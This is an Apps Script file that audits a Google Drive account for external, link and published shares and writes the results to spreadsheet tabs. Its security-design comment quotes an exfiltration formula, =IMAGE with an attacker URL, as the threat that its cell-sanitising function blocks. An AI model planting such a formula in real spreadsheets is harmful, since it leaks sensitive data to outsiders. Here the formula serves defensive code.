// SPDX-License-Identifier: MIT
// Copyright (c) 2026 RESIDENT.NGO

/**
 * External-share audit for one Google Drive account.
 *
 * Inventories files in this account's Drive corpus, plus any explicitly
 * configured shared drives, and reports each permission held by someone outside
 * the organization along with link, published and public shares. Results go to
 * a timestamped tab in the spreadsheet this script is bound to, alongside an
 * _info tab that states how complete the run was.
 *
 * Entry points:
 *   startNewAudit()  - begin a fresh audit in new tabs
 *   continueAudit()  - resume a run that paused at the execution time limit
 *   auditStatus()    - report progress without changing anything
 *
 *
 * SECURITY DESIGN
 *
 * Metadata-only privilege. The manifest requests exactly two scopes:
 * drive.metadata.readonly and spreadsheets.currentonly. Google documents the
 * metadata scopes as strictly prohibiting access to file content: even on a
 * file this account owns outright, the API will refuse a download while the app
 * holds only that scope. So this script is structurally incapable of reading a
 * single document it inspects.
 *
 * Apps Script can infer broader scopes than a script actually needs, and
 * Google's own guidance is to set scopes explicitly rather than rely on
 * inference. The manifest therefore pins this project to those two scopes and
 * nothing else. Verify the result at authorization time: the consent screen
 * must offer only to see information about Drive files and to manage this one
 * spreadsheet. If it offers access to all your Drive files, the manifest did
 * not take effect.
 *
 * DriveApp is deliberately unused. It has no read-only mode, so it requires the
 * full drive scope, and it costs an extra API call per file to enumerate
 * editors and viewers. The advanced Drive service returns ACLs from the same
 * calls.
 *
 * Untrusted input into a spreadsheet. A filename is chosen by whoever shares
 * the file, so every string this audit collects is attacker-controlled by
 * definition. Range.setValues() evaluates a leading '=' as a formula, which
 * inside this report - a document listing file IDs, owner addresses and
 * external collaborator addresses - would hand an outsider an outbound channel
 * for the audit itself, for instance =IMAGE("https://attacker/?d="&B2). Every
 * untrusted value therefore passes through safeCell_() before it is written,
 * and the columns are formatted as plain text as a second layer.
 *
 * Sensitive output. The result tab is a map of this account's exposure. Keep the
 * host spreadsheet out of shared folders and share it only with people entitled
 * to that map.
 *
 *
 * COVERAGE DESIGN
 *
 * ACLs come from Permissions.list, not from the permissions field embedded in
 * files.list responses. Google documents that embedded field as available only
 * when the requesting user can share the file, and never populated for items in
 * shared drives - the same holds for shared, owners and ownedByMe. Reading it
 * alone would return silently empty results for all shared drive content, which
 * is the worst failure an audit can have: a clean-looking report over an
 * unexamined corpus. The embedded field is still used as a fast path where it is
 * present, which keeps owned My Drive files to one API call.
 *
 * Additional permission views. A permission can belong to a view rather than to
 * the file itself, and the view changes what the grant actually means:
 *
 *   published - role is publishedReader. Access to the published rendering of
 *               the item, not to the Drive file. Google does NOT return these
 *               permissions unless the request sets
 *               includePermissionsForView: 'published', so an audit that omits
 *               that parameter cannot see published exposure at all. Both
 *               Files.list and Permissions.list set it here, because owned My
 *               Drive files take the embedded fast path and never reach
 *               Permissions.list.
 *   metadata  - the item is visible only in the metadata view, because it has
 *               limited access and the grantee has at least read access to the
 *               parent. Folders only. The grantee can see that the folder
 *               exists but cannot open it or reach its contents. These are
 *               returned by default, so an audit that does not request the view
 *               field reports them as ordinary access and overstates exposure.
 *
 * Both are classified separately below rather than folded into the ordinary
 * findings, because one is exposure the report would otherwise miss and the
 * other is exposure the report would otherwise invent.
 *
 * Publishing is not necessarily public. What a published rendering is reachable
 * by depends on the item's own sharing settings: everyone on the web, everyone
 * in the organization, or a smaller group. So the principal is classified first
 * and the view second - an internally-scoped publication is reported as
 * published-view-internal, and only a published permission whose principal is
 * genuinely unrestricted or outside the organization becomes published-view.
 *
 * Trashed files are scanned. Google is explicit that only the owner can trash a
 * file and that other users can still access it in the owner's trash until it is
 * permanently deleted. Filtering trashed items out of an exposure audit would
 * therefore hide live external access - and hide it in the one place people are
 * most likely to believe they have already revoked it. Only permanent deletion
 * ends the access. Trashed items are reported like any other, with a trashed
 * column so they can be told apart, and counted separately in the _info tab.
 *
 * Every file's ACL is read. There is no option to skip files that Drive reports
 * as carrying no direct permissions: hasAugmentedPermissions describes only
 * whether permissions sit directly on that file, while a permission on any
 * ancestor folder propagates to its descendants. A grant made on an
 * intermediate folder therefore appears in neither the file's direct
 * permissions nor the shared drive's own ACL, so skipping such files would
 * silently omit real exposure. Reading everything is slower and correct.
 *
 * Each shared drive's own ACL is audited as a separate stage. Drive membership
 * does surface on descendant files as an inherited permission with
 * permissionType 'member', so this stage is not the only way to see it. It is
 * still worth having: it records the grant once at its actual source instead of
 * once per file, it produces an authoritative membership list, it covers drives
 * with no files in them, and it points remediation at the drive's member list
 * rather than at a file's sharing dialog where removing the grant is
 * impossible.
 *
 * Shared drive IDs are configured by hand because discovering them needs
 * Drives.list, which accepts only the drive and drive.readonly scopes - both of
 * which grant file content access. Trading the metadata-only property for
 * convenience is the wrong deal for an audit tool, so coverage is instead made
 * explicit and stated in the _info tab.
 *
 * One corpus per query. Drive returns incompleteSearch=true when a query
 * spanning several corpora cannot be answered fully, so the user corpus and each
 * shared drive are scanned separately and every response is checked.
 *
 * Completeness is part of the report, not just the log. Whoever reads the
 * spreadsheet later has no access to the execution log and no way to tell a
 * clean result from a partial one, so the _info tab carries an explicit verdict
 * and names each blind spot. The verdict says COMPLETE FOR CONFIGURED SCOPE
 * rather than COMPLETE, because the configured scope is a choice the operator
 * made and an empty shared drive list is not the same thing as an absence of
 * shared drive exposure.
 *
 *
 * BLIND SPOTS THAT CODE CANNOT CLOSE
 *
 * Group membership. A grant to an internal group is reported as the group. If
 * that group contains an outside collaborator, the access is real and invisible
 * here, because the Drive API does not expand membership. REPORT_INTERNAL_GROUPS
 * surfaces every group grant so the memberships can be reviewed by hand;
 * expanding them would require Admin SDK Directory scopes, a separate privilege
 * decision. The same applies to target audiences, which appear as an opaque
 * domain and whose membership this API will not reveal.
 *
 * Unreadable ACLs. Files this account holds without sharing rights - typically
 * something shared by link where this account is only a reader - refuse an ACL
 * read and appear as acl-denied. Note the irony: those are often the most widely
 * exposed files in a Drive, and they are exactly the ones whose sharing state
 * cannot be inspected from here. Only their owner, or a domain-wide audit, can
 * resolve them. An acl-denied row is never evidence that a file is unshared.
 *
 * One account. Files never shared with this user are invisible regardless of how
 * exposed they are. Answering the question for a whole organization needs
 * domain-wide delegation, which is a different tool with a much larger blast
 * radius. Because this script needs no such credential, it can safely be handed
 * to colleagues to run against their own accounts.
 */


// Domains whose users are staff and generate no finding. Take this list from
// Admin console > Account > Domains > Manage domains, never from the Drive share
// dialog: that dialog labels everyone "at <primary domain>" whichever domain in
// the tenant their address actually belongs to, so a secondary-domain colleague
// looks internal there while their address says otherwise.
const INTERNAL_DOMAINS = ['yourdomain.org'];

// Tenant domains that should stay visible rather than disappear. Access from
// these is reported as semi-trusted-* instead of external-*: not an outside
// leak, but still shown. Use this for contractor domains or subsidiaries where
// the access is legitimate yet worth reviewing. Moving such a domain to
// INTERNAL_DOMAINS instead removes it from every future report, which is how an
// audit acquires a blind spot of its own making.
const SEMI_TRUSTED_DOMAINS = [];

// Shared drives to audit. Take each ID from its Drive URL:
// https://drive.google.com/drive/folders/<ID>  ->  '0AJ...'
// An empty list means no shared drive is audited, and the _info tab says so.
const SHARED_DRIVE_IDS = [];

// Report grants to internal groups, so their membership can be reviewed against
// the group-membership blind spot described above.
const REPORT_INTERNAL_GROUPS = true;

const INFO_SUFFIX = '_info';

// Pages are the unit of work. Shared drive pages are kept small because each
// file there costs its own ACL call.
const PAGE_SIZE_USER = 100;
const PAGE_SIZE_DRIVE = 20;

// Apps Script terminates an execution at six minutes. The budget is checked
// before starting a page, never mid-page, so the margin has to cover one whole
// page; five minutes leaves about a minute, comfortably more than a page needs.
// Overrunning is safe rather than merely unlikely - see the flush ordering in
// scan_() - so the margin buys speed, not correctness.
const TIME_BUDGET_MS = 5 * 60 * 1000;

// Transient ACL failures are retried before being believed.
const ACL_RETRIES = 3;
const ACL_BACKOFF_MS = 700;

const CHECKPOINT_KEYS = ['stageIndex', 'pageToken', 'scanned', 'flagged',
  'incomplete', 'aclDenied', 'aclFailed', 'trashedFindings', 'startedAt',
  'sheetName', 'infoName'];

const HEADER = [
  'scope', 'fileId', 'name', 'mimeType', 'link', 'owner', 'sharedDriveId',
  'trashed', 'finding', 'permType', 'role', 'principal', 'view', 'provenance',
  'inheritDisabled', 'aclSource'
];

// Workspace target audiences appear as type 'domain' with an opaque host under
// this suffix. They are an internal Workspace construct, not a third-party
// domain, so matching them prevents a whole class of false positives.
const TARGET_AUDIENCE_RE = /\.audience\.googledomains\.com$/i;

const PERM_SELECT =
  'permissions(id,type,role,emailAddress,domain,deleted,allowFileDiscovery,' +
  'view,inheritedPermissionsDisabled,' +
  'permissionDetails(inherited,inheritedFrom,permissionType,role))';

const FILE_FIELDS =
  'nextPageToken,incompleteSearch,files(id,name,mimeType,webViewLink,shared,' +
  'driveId,trashed,explicitlyTrashed,owners(emailAddress),' +
  PERM_SELECT + ')';

const PERM_FIELDS = 'nextPageToken,' + PERM_SELECT;

// Dark fonts on pale backgrounds: a bold mid-yellow on white is unreadable, and
// a status cell nobody can read is not a status cell.
const STYLE_OK = { font: '#0d652d', bg: '#e6f4ea' };
const STYLE_WARN = { font: '#b06000', bg: '#fef7e0' };
const STYLE_BAD = { font: '#b3261e', bg: '#fce8e6' };


// ---------------------------------------------------------------- entry points

function startNewAudit() {
  withLock_(function () {
    const props = PropertiesService.getUserProperties();
    const ss = SpreadsheetApp.getActive();
    clearCheckpoint_(props);

    // A tab per run. Checkpoints are per-user but the spreadsheet is shared, so
    // without this a second operator starting an audit would wipe the results of
    // a run someone else had paused midway - sequential interference that no
    // lock can prevent.
    const base = uniqueBase_(ss, Utilities.formatDate(new Date(),
      Session.getScriptTimeZone(), 'yyyy-MM-dd-HH:mm'));

    const resultSheet = prepareResultSheet_(createSheet_(ss, base));
    const infoSheet = createSheet_(ss, base + INFO_SUFFIX);

    props.setProperties({
      stageIndex: '0',
      startedAt: new Date().toISOString(),
      sheetName: resultSheet.getName(),
      infoName: infoSheet.getName()
    });

    Logger.log('Results: %s | Coverage: %s',
      resultSheet.getName(), infoSheet.getName());
    scan_(props);
  });
}


function continueAudit() {
  withLock_(function () {
    const props = PropertiesService.getUserProperties();
    const stageIndex = props.getProperty('stageIndex');

    if (stageIndex === null) {
      Logger.log('No audit in progress. Run startNewAudit().');
      return;
    }
    // Without this guard a completed audit would restart from page one and
    // append a second copy of every finding to the same tab.
    if (Number(stageIndex) >= plan_().length) {
      Logger.log('The audit in %s already finished. Run startNewAudit() for a ' +
        'fresh one.', props.getProperty('sheetName'));
      return;
    }
    scan_(props);
  });
}


function auditStatus() {
  const props = PropertiesService.getUserProperties();
  const stages = plan_();
  const stageIndex = props.getProperty('stageIndex');

  if (stageIndex === null) {
    Logger.log('No audit in progress.');
    return;
  }
  Logger.log('%s | started %s | stage %s of %s | %s files | %s findings | ' +
    '%s incomplete page(s) | %s ACL denied | %s ACL failed',
    props.getProperty('sheetName'), props.getProperty('startedAt'),
    Math.min(Number(stageIndex) + 1, stages.length), stages.length,
    props.getProperty('scanned') || '0', props.getProperty('flagged') || '0',
    props.getProperty('incomplete') || '0',
    props.getProperty('aclDenied') || '0',
    props.getProperty('aclFailed') || '0');
}


// ---------------------------------------------------------------------- stages

/** One stage per unit of work, and never more than one corpus per query. */
function plan_() {
  const stages = [{ kind: 'files', label: 'user', corpora: 'user',
    pageSize: PAGE_SIZE_USER }];

  SHARED_DRIVE_IDS.forEach(function (id) {
    // The drive's own ACL comes first, so membership is recorded once at its
    // source before it shows up inherited on every descendant file.
    stages.push({ kind: 'driveRoot', label: 'drive-root:' + id, driveId: id });
    stages.push({ kind: 'files', label: 'drive:' + id, corpora: 'drive',
      driveId: id, pageSize: PAGE_SIZE_DRIVE });
  });
  return stages;
}


function scan_(props) {
  const stages = plan_();
  const sheetName = props.getProperty('sheetName');
  const sheet = SpreadsheetApp.getActive().getSheetByName(sheetName);
  const started = Date.now();

  if (!sheet) {
    throw new Error('Result tab ' + sheetName + ' is gone - deleted or ' +
      'renamed. Run startNewAudit() to begin again.');
  }

  let stageIndex = Number(props.getProperty('stageIndex') || 0);
  let pageToken = props.getProperty('pageToken') || null;
  let scanned = Number(props.getProperty('scanned') || 0);
  let flagged = Number(props.getProperty('flagged') || 0);
  let incomplete = Number(props.getProperty('incomplete') || 0);
  let aclDenied = Number(props.getProperty('aclDenied') || 0);
  let aclFailed = Number(props.getProperty('aclFailed') || 0);
  let trashedFindings = Number(props.getProperty('trashedFindings') || 0);

  // Each iteration handles exactly one page: build every row, write them, then
  // advance the checkpoint. Killed mid-page, nothing was written and the
  // checkpoint still points at the start of that page, so the retry redoes it
  // cleanly. The narrow window between writing and checkpointing can duplicate
  // one page, and that ordering is deliberate: in an audit a duplicated row is
  // a nuisance someone will notice, while a missing row is a wrong answer
  // nobody will.
  while (stageIndex < stages.length && Date.now() - started < TIME_BUDGET_MS) {
    const stage = stages[stageIndex];
    let rows = [];

    if (stage.kind === 'driveRoot') {
      const acl = readAcl_(stage.driveId);
      if (acl.error) {
        if (acl.kind === 'denied') aclDenied++; else aclFailed++;
        rows.push(errorRow_(stage.label, stage.driveId, acl.error, acl.kind));
      } else {
        rows = classify_({ id: stage.driveId, name: '(shared drive root)',
          mimeType: 'application/vnd.google-apps.drive',
          driveId: stage.driveId }, acl.permissions, stage.label, acl.source);
      }
      flush_(sheet, rows);
      flagged += rows.length;
      stageIndex++;

    } else {
      const args = {
        // No trashed filter: a trashed file keeps its permissions and stays
        // reachable by collaborators until it is permanently deleted, so
        // excluding trash would hide live external access.
        corpora: stage.corpora,
        includeItemsFromAllDrives: true,
        supportsAllDrives: true,
        // Without this, permissions belonging to the published view are omitted
        // from the response entirely.
        includePermissionsForView: 'published',
        pageSize: stage.pageSize,
        fields: FILE_FIELDS
      };
      if (stage.driveId) args.driveId = stage.driveId;
      if (pageToken) args.pageToken = pageToken;

      // Retried on transient failure. If it still fails, throwing is the right
      // outcome: the checkpoint has not advanced past this page, so a re-run
      // resumes here rather than the run silently reporting itself complete.
      const listCall = callWithRetry_(function () {
        return Drive.Files.list(args);
      });
      if (listCall.error) {
        throw new Error('Files.list failed on stage ' + stage.label + ' (' +
          listCall.kind + '): ' + listCall.error +
          ' - re-run continueAudit() to resume from this page.');
      }
      const res = listCall.value;

      // Recorded rather than thrown: aborting here would discard a checkpointed
      // run over a condition the operator needs summarised in the report.
      if (res.incompleteSearch) {
        incomplete++;
        Logger.log('WARNING: incompleteSearch=true on stage %s', stage.label);
      }

      const files = res.files || [];
      files.forEach(function (f) {
        const r = auditFile_(f, stage);
        if (r.kind === 'denied') aclDenied++;
        else if (r.kind === 'transient') aclFailed++;
        if (f.trashed) trashedFindings += r.rows.length;
        rows = rows.concat(r.rows);
      });

      flush_(sheet, rows);
      flagged += rows.length;
      scanned += files.length;
      pageToken = res.nextPageToken || null;
      if (!pageToken) stageIndex++;
    }

    props.setProperties({
      stageIndex: String(stageIndex),
      scanned: String(scanned),
      flagged: String(flagged),
      incomplete: String(incomplete),
      aclDenied: String(aclDenied),
      aclFailed: String(aclFailed),
      trashedFindings: String(trashedFindings)
    });
    if (pageToken) {
      props.setProperty('pageToken', pageToken);
    } else {
      props.deleteProperty('pageToken');
    }
  }

  const done = stageIndex >= stages.length;
  writeInfo_(props, stages, done, scanned, flagged, incomplete, aclDenied,
    aclFailed, trashedFindings);

  if (done) {
    Logger.log('Finished: %s files, %s findings. Coverage verdict is in %s.',
      scanned, flagged, props.getProperty('infoName'));
  } else {
    Logger.log('Paused: %s files, %s findings. Run continueAudit().',
      scanned, flagged);
  }
}


// -------------------------------------------------------------------- ACL read

/**
 * Return the ACL for a file or a shared drive.
 *
 * `embedded` is the permissions array from a files.list response when Drive
 * supplied one, which avoids a second call. It is absent for every shared drive
 * item and for any file this account cannot share, and those fall through to
 * Permissions.list - the same OAuth scope, one extra paginated call.
 */
function readAcl_(fileId, embedded) {
  if (embedded !== undefined) {
    return { permissions: embedded, source: 'embedded' };
  }

  const all = [];
  let token = null;

  do {
    const args = {
      supportsAllDrives: true,
      includePermissionsForView: 'published',
      pageSize: 100,
      fields: PERM_FIELDS
    };
    if (token) args.pageToken = token;

    const call = callWithRetry_(function () {
      return Drive.Permissions.list(fileId, args);
    });
    if (call.error) return { error: call.error, kind: call.kind };

    (call.value.permissions || []).forEach(function (p) { all.push(p); });
    token = call.value.nextPageToken || null;
  } while (token);

  return { permissions: all, source: 'permissions.list' };
}


/**
 * Run an API call, retrying transient failures with exponential backoff.
 *
 * A denial is permanent and returns at once. A rate limit or backend error is
 * retried, because letting a momentary blip through would put a fake coverage
 * gap in a security report - and the reverse, treating a real denial as
 * transient, would waste three sleeps on every such file. Returns
 * { value } on success or { error, kind } once retries are exhausted; callers
 * decide whether that is recoverable.
 */
function callWithRetry_(fn) {
  let lastError = null;
  for (let attempt = 0; attempt <= ACL_RETRIES; attempt++) {
    try {
      return { value: fn() };
    } catch (e) {
      lastError = String(e && e.message ? e.message : e);
      if (errorKind_(lastError) === 'denied') break;
      if (attempt < ACL_RETRIES) {
        Utilities.sleep(ACL_BACKOFF_MS * Math.pow(2, attempt));
      }
    }
  }
  return { error: lastError, kind: errorKind_(lastError) };
}


/**
 * 'denied'    - permanent. This account may not read this ACL. An irreducible
 *               limit of auditing at user privilege, not a fault to fix.
 * 'transient' - rate limit, backend error, or anything unrecognised. Retried,
 *               and if it still fails the audit genuinely did not complete.
 *
 * Order matters: Drive answers user rate limits with HTTP 403, the same status
 * as a permission denial, so the rate-limit patterns are tested first. An
 * unrecognised message is treated as transient so that it is retried and, if it
 * persists, counted against the coverage verdict rather than quietly filed as
 * an expected limitation.
 */
function errorKind_(message) {
  const m = String(message).toLowerCase();
  if (/rate limit|ratelimit|quota|backend ?error|internal error|try again|timed out|timeout|unavailable|\b429\b|\b500\b|\b502\b|\b503\b/
      .test(m)) {
    return 'transient';
  }
  if (/permission|insufficient|forbidden|not ?found|access denied|cannot be accessed|\b403\b|\b404\b/
      .test(m)) {
    return 'denied';
  }
  return 'transient';
}


function auditFile_(f, stage) {
  // Every file's ACL is read. See the note on hasAugmentedPermissions in the
  // header: a grant on an ancestor folder reaches this file without appearing
  // in either its direct permissions or the shared drive's own ACL.
  const acl = readAcl_(f.id, f.permissions);

  if (acl.error) {
    return { kind: acl.kind,
      rows: [errorRow_(stage.label, f.id, acl.error, acl.kind, f)] };
  }
  return { kind: null,
    rows: classify_(f, acl.permissions, stage.label, acl.source) };
}


// -------------------------------------------------------------------- analysis

function classify_(f, permissions, scope, aclSource) {
  const rows = [];
  // Drive does not populate owners for shared drive items, by design: they have
  // no owner, the drive holds them. An absent owner here means container-owned,
  // not unknown.
  const owner = (f.owners && f.owners[0] && f.owners[0].emailAddress) || '';
  const ownerExternal = owner !== '' && emailClass_(owner) === 'external';
  let sawExternalOwner = false;

  (permissions || []).forEach(function (p) {
    if (p.deleted) return;

    const view = p.view || '';
    let finding = '';
    let principal = '';

    if (p.type === 'anyone') {
      principal = 'anyone';
      if (view === 'published') {
        finding = 'published-view';
      } else {
        // allowFileDiscovery marks an item as eligible to appear in search
        // results for its audience, as against one that merely opens for
        // anybody holding the link. Eligibility, not a guarantee of indexing.
        finding = p.allowFileDiscovery ? 'public-searchable' : 'anyone-with-link';
      }

    } else if (p.type === 'domain') {
      principal = p.domain || '';
      const dc = domainClass_(principal);

      // Principal first, view second: a publication scoped to the organization
      // is not external exposure, and calling it published-view would make the
      // report claim internet reachability that does not exist.
      if (TARGET_AUDIENCE_RE.test(principal)) {
        // An opaque Workspace target audience, not a third-party domain. Its
        // membership cannot be read through this API, hence *-review.
        finding = 'target-audience-review';
      } else if (dc === 'internal') {
        finding = view === 'published' ? 'published-view-internal' : '';
        if (finding === '') return;
      } else if (view === 'published') {
        finding = 'published-view';
      } else if (view === 'metadata') {
        finding = (dc === 'semi' ? 'semi-trusted' : 'external') +
          '-metadata-only';
      } else if (dc === 'semi') {
        finding = 'semi-trusted-domain';
      } else {
        finding = 'external-domain';
      }

    } else {                                    // user | group
      const email = p.emailAddress || '';
      if (email === '') return;
      principal = email;
      const ec = emailClass_(email);

      if (ec === 'internal') {
        if (view === 'published') {
          finding = 'published-view-internal';
        } else if (p.type === 'group' && REPORT_INTERNAL_GROUPS) {
          finding = 'internal-group-review';
        } else {
          return;
        }
      } else if (view === 'published') {
        finding = 'published-view';
      } else if (view === 'metadata') {
        // Limited-access folder: the grantee can see the folder exists but
        // cannot open it or reach its contents. Reporting this as ordinary
        // access would overstate the exposure.
        finding = (ec === 'semi' ? 'semi-trusted' : 'external') +
          '-metadata-only';
      } else if (ec === 'semi') {
        finding = 'semi-trusted-' + p.type;
      } else if (p.role === 'owner') {
        finding = 'externally-owned';
        sawExternalOwner = true;
      } else {
        finding = 'external-' + p.type;         // external-user | external-group
      }
    }

    rows.push(row_({
      scope: scope, file: f, owner: owner, finding: finding,
      permType: p.type, role: p.role, principal: principal, view: view,
      provenance: provenance_(p),
      inheritDisabled: p.inheritedPermissionsDisabled ? 'yes' : '',
      aclSource: aclSource
    }));
  });

  if (ownerExternal && !sawExternalOwner) {
    rows.push(row_({
      scope: scope, file: f, owner: owner, finding: 'externally-owned',
      permType: 'owner', role: 'owner', principal: owner, aclSource: aclSource
    }));
  }

  return rows;
}


/**
 * Where a permission comes from, across all of its permissionDetails entries.
 *
 * One permission can hold several: Google's own example shows the same grant
 * inherited at commenter and applied directly at writer. Reading a single entry
 * would misreport provenance, and that misleads remediation - removing a parent
 * grant does nothing to a direct one, so a row marked purely inherited would
 * send someone to fix the wrong place.
 */
function provenance_(p) {
  const details = p.permissionDetails;
  if (!details || !details.length) return 'direct';   // absent => not inherited

  let direct = false;
  let inherited = false;
  details.forEach(function (d) {
    if (d.inherited) inherited = true; else direct = true;
  });

  if (direct && inherited) return 'direct+inherited';
  if (inherited) return 'inherited';
  return 'direct';
}


/** 'internal' | 'semi' | 'external' */
function domainClass_(domain) {
  const d = String(domain || '').toLowerCase();
  if (d === '') return 'external';
  if (INTERNAL_DOMAINS.indexOf(d) !== -1) return 'internal';
  if (SEMI_TRUSTED_DOMAINS.indexOf(d) !== -1) return 'semi';
  return 'external';
}


function emailClass_(email) {
  const s = String(email).toLowerCase();
  const at = s.lastIndexOf('@');
  if (at < 0) return 'external';
  return domainClass_(s.slice(at + 1));
}


// ------------------------------------------------------------ sheet + sanitise

/**
 * Force a value to be stored as literal text.
 *
 * Every string reaching this function was chosen by whoever shared the file, so
 * it is attacker-controlled input arriving at a spreadsheet writer that
 * evaluates formulas. A leading apostrophe marks the cell as text. Leading tab,
 * CR and LF are covered as well because they are the ordinary way to slip a
 * formula past a check that only looks at the first character.
 */
function safeCell_(value) {
  if (value === null || value === undefined) return '';
  const s = String(value);
  if (s === '') return '';
  if (/^[=+\-@\t\r\n]/.test(s)) return "'" + s;
  return s;
}


/**
 * How the trashed state is reported. Distinguishing a deliberate delete from an
 * item swept up in a trashed parent matters during triage: the second often
 * means nobody looked at this file at all.
 */
function trashedLabel_(f) {
  if (!f || !f.trashed) return '';
  return f.explicitlyTrashed ? 'yes' : 'yes (parent)';
}


/** Build one output row. Keyed rather than positional: fifteen columns is well
 *  past the point where argument order can be trusted to stay correct. */
function row_(o) {
  const f = o.file || {};
  return [
    o.scope, safeCell_(f.id), safeCell_(f.name), safeCell_(f.mimeType),
    safeCell_(f.webViewLink), safeCell_(o.owner), safeCell_(f.driveId),
    trashedLabel_(f),
    o.finding, o.permType, o.role, safeCell_(o.principal), o.view,
    o.provenance, o.inheritDisabled, o.aclSource
  ].map(function (v) { return v === undefined || v === null ? '' : v; });
}


function errorRow_(scope, fileId, message, kind, f) {
  return row_({
    scope: scope,
    file: f || { id: fileId },
    finding: kind === 'denied' ? 'acl-denied' : 'acl-read-failed',
    aclSource: kind + ': ' + String(message).slice(0, 200)
  });
}


/** Append a suffix until neither tab name of the pair is taken. */
function uniqueBase_(ss, base) {
  let candidate = base;
  let n = 2;
  while (ss.getSheetByName(candidate) ||
         ss.getSheetByName(candidate + INFO_SUFFIX)) {
    candidate = base + '-' + n;
    n++;
  }
  return candidate;
}


/**
 * Create a tab, falling back to a sanitised name if Sheets rejects the one
 * asked for. Callers read the real name back with getName(), so a substitution
 * is cosmetic rather than something that could lose track of the output.
 */
function createSheet_(ss, name) {
  try {
    return ss.insertSheet(name);
  } catch (e) {
    const safe = name.replace(/[:\\\/\?\*\[\]]/g, '-');
    Logger.log('Tab name "%s" was rejected; using "%s".', name, safe);
    return ss.insertSheet(safe);
  }
}


function prepareResultSheet_(sh) {
  // Plain-text column format, standing behind safeCell_ as a second layer.
  sh.getRange(1, 1, sh.getMaxRows(), HEADER.length).setNumberFormat('@');
  sh.getRange(1, 1, 1, HEADER.length).setValues([HEADER])
    .setFontWeight('bold');
  sh.setFrozenRows(1);
  return sh;
}


function flush_(sheet, rows) {
  if (!rows.length) return;
  sheet.getRange(sheet.getLastRow() + 1, 1, rows.length, HEADER.length)
    .setValues(rows);
  SpreadsheetApp.flush();
}


/**
 * Write the coverage statement.
 *
 * The verdict has three outcomes rather than two, because "the audit did not
 * finish" and "the audit finished and this is the ceiling of what an
 * unprivileged account can see" are different claims. Collapsing them would
 * leave the verdict permanently negative on any account holding
 * shared-with-me files, and a warning that is always lit tells the reader
 * nothing. Success is qualified as FOR CONFIGURED SCOPE because what was in
 * scope is an operator choice recorded below, not a property of the account.
 */
function writeInfo_(props, stages, done, scanned, flagged, incomplete,
    aclDenied, aclFailed, trashedFindings) {
  const ss = SpreadsheetApp.getActive();
  const name = props.getProperty('infoName');
  const sh = ss.getSheetByName(name) || createSheet_(ss, name);

  let verdict;
  let verdictStyle;
  if (!done) {
    verdict = 'INCOMPLETE - run paused, continue with continueAudit()';
    verdictStyle = STYLE_WARN;
  } else if (incomplete > 0 || aclFailed > 0) {
    verdict = 'INCOMPLETE - the audit did not finish cleanly, re-run it';
    verdictStyle = STYLE_BAD;
  } else if (aclDenied > 0) {
    verdict = 'COMPLETE FOR CONFIGURED SCOPE - ' + aclDenied + ' file(s) this ' +
      'account may not inspect';
    verdictStyle = STYLE_OK;
  } else {
    verdict = 'COMPLETE FOR CONFIGURED SCOPE';
    verdictStyle = STYLE_OK;
  }

  const runState = done ? 'FINISHED' : 'MORE RUNS NEEDED - run continueAudit()';
  const runStyle = done ? STYLE_OK : STYLE_WARN;

  const rows = [
    ['Results tab', props.getProperty('sheetName')],
    ['Started', props.getProperty('startedAt')],
    ['Last run', new Date().toISOString()],
    ['Run state', runState],
    ['Coverage verdict', verdict],
    ['', ''],
    ['Treated as internal', INTERNAL_DOMAINS.join(', ')],
    ['Treated as semi-trusted',
      SEMI_TRUSTED_DOMAINS.length ? SEMI_TRUSTED_DOMAINS.join(', ') : 'none'],
    ['Domain list caveat',
      'Every classification below rests on the two lists above. A tenant ' +
      'domain missing from them shows up as external, a false positive you ' +
      'will notice. An outside domain wrongly listed is suppressed entirely, ' +
      'a false negative you will not. Verify against Admin console > Account ' +
      '> Domains.'],
    ['', ''],
    ['Drive corpus (My Drive + shared-with-me)', done ? 'scanned' : 'in progress'],
    ['Shared drives configured', String(SHARED_DRIVE_IDS.length)],
    ['Shared drives audited',
      SHARED_DRIVE_IDS.length ? SHARED_DRIVE_IDS.join(', ') : 'NONE CONFIGURED'],
    ['Stages in plan', String(stages.length)],
    ['Published view', 'included (includePermissionsForView=published)'],
    ['Trashed items', 'included - see the trashed-file note below'],
    ['', ''],
    ['Files examined', String(scanned)],
    ['Findings written', String(flagged)],
    ['Pages with incompleteSearch', String(incomplete)],
    ['Findings on trashed files', String(trashedFindings) +
      ' - trashing does NOT revoke access. Google: only the owner can trash a ' +
      'file, and other users can still access it in the owner\'s trash until ' +
      'it is permanently deleted. Filter the trashed column and treat these ' +
      'as live exposure. Only permanent deletion, or removing the ' +
      'permission, ends the access.'],
    ['ACL denied (permanent)', String(aclDenied) +
      ' - acl-denied rows. Expected: files held without sharing rights, ' +
      'usually shared to this account by link. Not a fault, and not evidence ' +
      'those files are unshared.'],
    ['ACL read failed (transient)', String(aclFailed) +
      ' - acl-read-failed rows. Retried ' + ACL_RETRIES + ' times with ' +
      'backoff and still failed. Anything above zero means re-run the audit.'],
    ['', ''],
    ['Blind spot: group members',
      'A grant to an internal group is reported as the group. Members outside ' +
      INTERNAL_DOMAINS.join('/') + ' hold real access that is invisible here. ' +
      'Check internal-group-review rows against group membership separately. ' +
      'target-audience-review rows have the same limitation.'],
    ['Blind spot: scope',
      'One account only, plus the shared drives listed above. Files never ' +
      'shared with this user are invisible however exposed they are, and an ' +
      'empty shared drive list is not evidence of no shared drive exposure.'],
    ['Blind spot: unreadable ACLs',
      'Link-shared files where this account is only a reader refuse an ACL ' +
      'read, and those are often the most widely exposed files in a Drive. ' +
      'Only their owner, or a domain-wide audit, can settle them.']
  ];

  sh.clear();
  sh.getRange(1, 1, sh.getMaxRows(), 2).setNumberFormat('@');
  sh.getRange(1, 1, rows.length, 2).setValues(rows.map(function (r) {
    return [safeCell_(r[0]), safeCell_(r[1])];
  }));
  sh.getRange(1, 1, rows.length, 1).setFontWeight('bold');

  // Locate the status rows by label rather than by a hard-coded index, so
  // editing the block above cannot silently colour the wrong cell.
  const labels = rows.map(function (r) { return r[0]; });
  style_(sh, labels.indexOf('Run state') + 1, runStyle);
  style_(sh, labels.indexOf('Coverage verdict') + 1, verdictStyle);

  sh.setColumnWidth(1, 270);
  sh.setColumnWidth(2, 640);
  SpreadsheetApp.flush();
}


function style_(sh, row, style) {
  if (row < 1) return;
  sh.getRange(row, 2)
    .setFontWeight('bold')
    .setFontColor(style.font)
    .setBackground(style.bg);
}


// ------------------------------------------------------------------- plumbing

/**
 * Serialise runs against this spreadsheet. Checkpoints are per-user but the
 * spreadsheet is shared, so concurrent executions must not interleave their
 * writes. A blocked caller gets an error instead of a corrupt tab. Sequential
